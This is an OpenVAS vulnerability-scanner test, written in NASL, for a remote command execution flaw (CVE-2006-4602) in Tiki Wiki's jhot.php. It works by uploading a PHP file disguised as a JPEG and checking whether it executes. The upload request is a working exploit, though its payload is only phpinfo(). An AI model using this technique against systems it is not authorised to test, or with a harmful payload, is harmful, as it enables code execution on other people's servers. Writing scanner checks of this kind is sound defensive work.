##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_tikiwiki_jhot_remote_cmd_exec_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Tiki Wiki CMS Groupware jhot.php Remote Command Execution Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:tiki:tikiwiki_cms/groupware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802946");
  script_version("$Revision: 13659 $");
  script_cve_id("CVE-2006-4602");
  script_bugtraq_id(19819);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2012-08-22 13:59:26 +0530 (Wed, 22 Aug 2012)");
  script_name("Tiki Wiki CMS Groupware jhot.php Remote Command Execution Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_tikiwiki_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("TikiWiki/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/21733");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/2288/");

  script_tag(name:"impact", value:"Successful exploitation will let the attacker execute arbitrary system
  commands with the privileges of the webserver process.");

  script_tag(name:"affected", value:"Tiki Wiki CMS Groupware version 1.9.4 and prior");

  script_tag(name:"insight", value:"The flaw is due to 'jhot.php' script not correctly verifying
  uploaded files. This can be exploited to execute arbitrary PHP code by
  uploading a malicious PHP script to the 'img/wiki' directory.");

  script_tag(name:"solution", value:"Upgrade to Tiki Wiki CMS Groupware version 1.9.5 or later.");

  script_tag(name:"summary", value:"This host is running Tiki Wiki CMS Groupware and is prone to remote command
  execution vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://info.tiki.org/Download");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
if( dir == "/" ) dir = "";

buf = http_get_cache( item:dir + "/jhot.php", port:port );
if( buf !~ "^HTTP/1\.[01] 200" ) exit( 0 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

fname = "ovtest_" + rand() + ".php";

## Create a random file and write the data into file
content = string( "--bound\r\n",
                  "Content-Disposition: form-data; name='filepath'; filename='" + fname + "';\r\n",
                  "Content-Type: image/jpeg;\r\n",
                  "\r\n",
                  "<?php phpinfo(); ?>\r\n",
                  "\r\n",
                  "--bound--\r\n" );

req2 = string( "POST ", dir, "/jhot.php HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "User-Agent: ", useragent, "\r\n",
               "Connection: Keep-Alive\r\n",
               "Content-Type: multipart/form-data; boundary=bound\r\n",
               "Content-Length: " +  strlen( content ) + "\r\n",
               "\r\n",
               content );
res2 = http_keepalive_send_recv( port:port, data:req2, bodyonly:FALSE );

if( res2 && res2 =~ "HTTP/1\.. 200" ) {

  url = dir + "/img/wiki/" + fname;

  if( http_vuln_check( port:port, url:url, pattern:"<title>phpinfo\(\)", check_header:TRUE ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );